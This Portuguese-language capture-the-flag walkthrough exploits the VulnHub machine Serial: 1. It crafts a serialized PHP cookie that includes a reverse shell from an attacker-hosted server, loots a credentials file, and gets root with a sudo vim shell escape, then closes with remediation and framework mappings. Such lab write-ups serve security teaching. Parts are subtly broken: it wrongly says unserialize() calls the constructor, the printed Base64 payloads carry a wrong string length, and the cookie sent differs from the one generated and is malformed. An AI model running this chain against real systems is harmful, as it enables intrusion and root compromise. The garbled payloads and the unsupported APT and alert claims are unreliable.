# Serial: 1 — Deserialize, Inclua, Execute, Escalone

Bora rapaziada!! Essa máquina é um laboratório puro de desserialização PHP e é uma das melhores caixas focadas de exploração para entender a cadeia completa de ataque de desserialização. A cadeia de vulnerabilidades aqui é elegante: uma aplicação web armazena um objeto PHP serializado codificado em Base64 num cookie, um arquivo de backup expõe o código-fonte, análise estática revela uma classe `Log` com um gadget LFI no construtor, criar um objeto serializado malicioso aciona inclusão remota de arquivo por uma URL controlada pelo atacante, e uma entrada sudo no `vim` entrega root via GTFOBins. Cada passo mapeia diretamente para um padrão de ataque do mundo real. Uma das melhores para o portfólio, véi.

| Campo | Valor |
|---|---|
| **Nível** | Iniciante/Intermediário |
| **VM Alvo** | Serial: 1 |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/serial-1,440/ |
| **Técnicas** | Nmap, brute-force de diretórios, divulgação de código-fonte via backup, análise de desserialização PHP, criação de objeto Base64, inclusão remota de arquivo PHP via desserialização, reutilização de credenciais SSH, GTFOBin sudo vim |
| **CVEs** | CWE-502 (Desserialização de Dados Não Confiáveis), CWE-98 (Controle Inadequado de Nome de Arquivo para Include/Require em PHP) |
| **Grupos APT** | APT41: uso documentado de vulnerabilidades de desserialização PHP em ataques a aplicações web para acesso inicial no setor financeiro; FIN7: usa vulnerabilidades de aplicações PHP incluindo cadeias de desserialização e LFI como vetores de acesso inicial em alvos de hospitalidade e varejo |

---

## Resumo do Ataque

```
nmap -> porta 80 (HTTP) + porta 22 (SSH)
  |
  +-- dirb -> /backup -> arquivo de código-fonte (.zip)
        |
        +-- analisa código-fonte PHP:
        |     - cookie contém Base64(serialize(objeto))
        |     - classe Log: construtor faz include($this->type_log)
        |
        +-- cria objeto Log serializado malicioso:
        |     - type_log = "http://<atacante>/shell.php"
              |
              +-- serve PHP shell no servidor HTTP do atacante
                    |
                    +-- define cookie criado -> aciona desserialização -> RFI -> RCE
                          |
                          +-- reverse shell como www-data
                                |
                                +-- encontra credentials.txt.bak -> login SSH
                                      |
                                      +-- sudo -l -> (root) NOPASSWD: /usr/bin/vim
                                            |
                                            +-- sudo vim -> :!/bin/sh -> root
                                                  |
                                                  +-- /root/flag.txt
```

---

## Metodologia

1. Nmap: identificar HTTP (80) e SSH (22)
2. Brute-force de diretórios: encontrar arquivo `/backup` com código-fonte
3. Análise estática do código-fonte PHP: identificar vulnerabilidade de desserialização e gadget LFI da classe Log
4. Criar objeto PHP serializado malicioso com URL controlada pelo atacante em `type_log`
5. Servir PHP reverse shell no servidor HTTP do atacante
6. Enviar cookie criado para acionar desserialização, RFI e RCE
7. Enumerar credenciais do sistema de arquivos; login SSH
8. Escalonamento de privilégios via sudo vim (GTFOBins)

---

## Passo 1 — Scan de Portas

```bash
sudo netdiscover -r 192.168.2.0/24
# Alvo: 192.168.2.6

nmap -p- -A 192.168.2.6
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache
```

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Brute-Force de Diretórios e Descoberta de Backup

```bash
gobuster dir -u http://192.168.2.6/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,zip,bak \
  -t 40

# Achado principal: /backup/
```

Navegue até `/backup/` e baixe o arquivo:

```bash
wget http://192.168.2.6/backup/source.zip
unzip source.zip -d /tmp/serial_source/
```

**MITRE ATT&CK:** T1595.003 — Varredura Ativa: Wordlist Scanning; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Análise de Código-Fonte

Examine o código-fonte extraído. O arquivo principal é o PHP que lida com cookies:

```php
// Padrão vulnerável típico em index.php ou similar:
$cookie_data = base64_decode($_COOKIE['user']);
$obj = unserialize($cookie_data);
$obj->log();
```

Encontre a definição da classe `Log`:

```php
class Log {
    public $type_log;
    
    public function __construct() {
        include($this->type_log);
    }
    
    public function log() {
        include($this->type_log);
    }
}
```

Esse é o gadget. Quando `unserialize()` cria um objeto `Log`, o construtor é chamado e `include($this->type_log)` executa. Se `type_log` contém uma URL controlada pelo atacante, isso vira Inclusão Remota de Arquivo (RFI).

**Nota do mundo real:** Vulnerabilidades de desserialização PHP (CWE-502) estão entre as principais vulnerabilidades de aplicações web. O `unserialize()` do PHP aciona chamadas de construtor e métodos mágicos em classes arbitrárias durante a reconstrução do objeto. Qualquer classe com um gadget perigoso (como uma chamada `include()`) vira uma arma quando um atacante controla os dados serializados. Por isso aplicações PHP modernas usam JSON ou usam o parâmetro `allowed_classes` do `unserialize()`.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 4 — Criar Objeto Serializado Malicioso

Escreva um script PHP para criar o objeto serializado malicioso:

```php
<?php
class Log {
    public $type_log;
}

$obj = new Log();
$obj->type_log = "http://<ip_atacante>/shell.php";

$serialized = serialize($obj);
$encoded = base64_encode($serialized);
echo $encoded;
?>
```

Execute o script:

```bash
php /tmp/craft_payload.php
# Saída (exemplo):
# TzozOiJMb2ciOjE6e3M6OToidHlwZV9sb2ciO3M6MzU6Imh0dHA6Ly8xOTIuMTY4LjIuMy9zaGVsbC5waHAiO30=
```

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Voltada para Internet; T1059.004 — Shell Unix

---

## Passo 5 — Payload RFI e Entrega de Reverse Shell

Crie o PHP reverse shell para servir da máquina atacante:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /var/www/html/shell.php
# Edite LHOST para o IP do atacante e LPORT para 4444
nano /var/www/html/shell.php
```

Inicie um servidor web e listener netcat:

```bash
# Servidor HTTP Python
python3 -m http.server 80

# Listener Netcat (terminal separado)
nc -lvnp 4444
```

Envie o cookie malicioso para o alvo:

```bash
curl -s http://192.168.2.6/index.php \
  --cookie "user=TzozOiJMb2ciOjE6e3M4OToieXBlX2xvZyI7czozNToiaHR0cDovLzE5Mi4xNjguMi4zL3NoZWxsLnBocCI7fQ=="
```

O servidor desserializa o cookie, cria um objeto `Log`, chama `include("http://<atacante>/shell.php")`, que busca e executa o PHP reverse shell. O listener netcat recebe o callback como `www-data`.

Estabilize a shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z -> stty raw -echo; fg -> Enter duas vezes
```

**MITRE ATT&CK:** T1059.004 — Shell Unix; T1071.001 — Protocolo de Camada de Aplicação: Web

---

## Passo 6 — Descoberta de Credenciais e Login SSH

Enumere o sistema de arquivos em busca de arquivos de credenciais:

```bash
find / -name "*.bak" -o -name "*.txt" -o -name "credentials*" 2>/dev/null | grep -v proc
ls -la /home/*/
cat /home/<usuario>/credentials.txt.bak
```

Encontre credenciais para um usuário existente. Use-as para login SSH para uma sessão mais estável:

```bash
ssh <usuario>@192.168.2.6
# Senha: credencial encontrada
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos; T1021.004 — Serviços Remotos: SSH

---

## Passo 7 — Escalonamento de Privilégios via sudo vim

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/vim
```

GTFOBins documenta o escape de shell do vim:

```bash
sudo vim -c ':!/bin/sh'
```

Você chega como root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

Sensacional!! Desserialização PHP para RFI para sudo vim. Cada passo foi limpo.

**Nota do mundo real:** Editores de texto no sudo são um achado clássico de escalonamento de privilégios. vim, nano e emacs todos têm comandos de escape de shell. A documentação GTFOBins cobre todos eles. A correção é sempre remover o editor do sudoers completamente e usar um script wrapper específico se a edição de arquivos root for genuinamente necessária.

**MITRE ATT&CK:** T1548.003 — Abuso de Controle de Elevação: Sudo; T1059.004 — Shell Unix

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Usado/Quebrado |
|---|---|---|---|
| Código-fonte | Desserialização PHP + gadget LFI classe Log | /backup/source.zip | Análise estática |
| RCE | uid=33(www-data) | RFI de desserialização via cookie criado | Objeto Log serializado malicioso |
| Credencial | usuario:<senha> | /home/usuario/credentials.txt.bak | Login SSH |
| Flag root | (varia) | /root/flag.txt | GTFOBin sudo vim |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | PHP unserialize() com dados não confiáveis (CWE-502) | Desserialização insegura está no OWASP Top 10 A08:2021; explorada em grandes brechas (Yahoo, Jenkins, WebLogic) | Nunca chame unserialize() em dados controlados pelo usuário; use json_decode(); use parâmetro allowed_classes |
| 2 | Arquivo de backup exposto via servidor web (/backup/) | Arquivos de backup deixados no web root são fonte comum de divulgação de código-fonte; encontrados constantemente em engajamentos reais | Nunca armazene backups em diretórios acessíveis via web; use armazenamento de backup fora do servidor |
| 3 | Inclusão Remota de Arquivo via include() em objeto desserializado | RFI requer allow_url_include=On na config PHP; esse ajuste é desabilitado por padrão mas às vezes habilitado | Audite php.ini: garanta allow_url_include=Off, allow_url_fopen=Off em produção |
| 4 | credentials.txt.bak deixado no diretório home do usuário | Arquivos de credenciais no sistema de arquivos são um achado top em pós-exploração; devs os criam por conveniência | Enforce política de gestão de segredos; use credential stores (HashiCorp Vault, AWS Secrets Manager) |
| 5 | sudo vim concede escape de shell root | Qualquer editor de texto com sudo NOPASSWD concede root via escape de shell | Audite sudoers: remova editores de texto; restrinja a scripts específicos com menor privilégio |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Varredura Ativa: Wordlist Scanning | T1595.003 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada para Internet (desserialização PHP) | T1190 |
| Execução | Execução | Interpretador de Scripts: Shell Unix | T1059.004 |
| Comando e Controle | C2 | Protocolo de Camada de Aplicação: Web (RFI) | T1071.001 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: Sudo (vim) | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Nunca chame unserialize() em dados controlados pelo usuário** — use json_decode(); se desserialização for necessária, use `unserialize($data, ['allowed_classes' => false])`
2. **Desabilite allow_url_include em php.ini** — configure `allow_url_include = Off` em todos os ambientes PHP; também `allow_url_fopen = Off` a menos que estritamente necessário
3. **Remova arquivos de backup do web root** — mova todos os arquivos .zip, .bak, .sql para fora do document root; implemente verificação automatizada
4. **Armazenamento seguro de credenciais** — remova arquivos de credenciais do sistema de arquivos; use variáveis de ambiente, gerenciadores de segredos (HashiCorp Vault, AWS Secrets Manager)
5. **Remova editores de texto do sudoers** — vim, nano, emacs não devem aparecer no sudo NOPASSWD; audite com: `grep -r vim /etc/sudoers /etc/sudoers.d/`

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar uso de desserialização PHP; identificar práticas de armazenamento de backup |
| Proteger | Tecnologia de Proteção | Desabilitar allow_url_include; remover backups do web root; corrigir entradas sudo |
| Proteger | Segurança de Dados | Mover credenciais para gestão de segredos; remover arquivos de credenciais do sistema de arquivos |
| Detectar | Anomalias e Eventos | Alertar sobre requisições HTTP de saída do servidor web (fetch RFI); monitorar novos arquivos no web root |
| Responder | Planejamento de Resposta | Remover cookies de sessão maliciosos; rotacionar todas as credenciais; patch de desserialização |
| Recuperar | Planejamento de Recuperação | Reconstruir a partir de imagem limpa; auditar todo tratamento de entrada da aplicação PHP |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| CM-7 | Menor Funcionalidade | Desabilitar allow_url_include; desabilitar allow_url_fopen |
| AC-6 | Menor Privilégio | Remover editores de texto do sudoers; restringir sudo a scripts específicos |
| SA-11 | Testes e Avaliação pelo Desenvolvedor | SAST para chamadas unserialize() em dados controlados pelo usuário |
| SA-15 | Segurança no Processo de Desenvolvimento | Obrigar code review para padrões de desserialização |
| CM-3 | Controle de Mudança de Configuração | Auditar mudanças no php.ini; enforce configuração de baseline segura |

### CISA KEV

Vulnerabilidades de desserialização PHP (CWE-502) estão documentadas em múltiplos alertas CISA como vetores de acesso inicial de alto impacto. O Alerta CISA AA22-074A lista desserialização de aplicações como uma das técnicas usadas por atores de ameaças de estado-nação e criminosos para acesso inicial a aplicações web empresariais.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL3 (SAST para unserialize(); DAST para exploração de desserialização) |
| Gestão de Ativos (ASSET) | Gerenciar Configurações | MIL2 (baseline php.ini; allow_url_include=Off) |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Credenciais | MIL3 (gerenciador de segredos; sem arquivos de credenciais no sistema de arquivos) |

### MITRE D3FEND

- **D3-SAOR** — Hardening de Aplicação: desabilitar allow_url_include; práticas seguras de desserialização
- **D3-ACH** — Hardening de Configuração de Aplicação: baseline php.ini; restrições sudo
- **D3-FIM** — Monitoramento de Integridade de Arquivos: monitorar web root e diretórios home para arquivos inesperados

---

## Pensamentos Finais

Serial: 1 ensina a cadeia completa de ataque de desserialização PHP de forma focada e bem estruturada. Divulgação de código-fonte leva à análise estática, leva à criação de objeto, leva à RFI, leva à shell. Depois credenciais em disco levam ao SSH, e sudo vim fecha tudo. Cada passo é educativo e diretamente aplicável a pentest real de aplicações web.

A máquina merece atenção de quem está aprendendo segurança de aplicações. Desserialização PHP é uma classe de CVE real (CWE-502 está no OWASP Top 10), o padrão de gadget RFI é real, e o escalonamento de editor de texto sudo é encontrado em ambientes de produção com mais frequência do que deveria.

Se você entendeu cada passo, está pronto para cadeias de desserialização mais complexas (Java, Python pickle, .NET). Essa é a fundação.

Thanks guys!! (❍ᴥ❍ʋ)
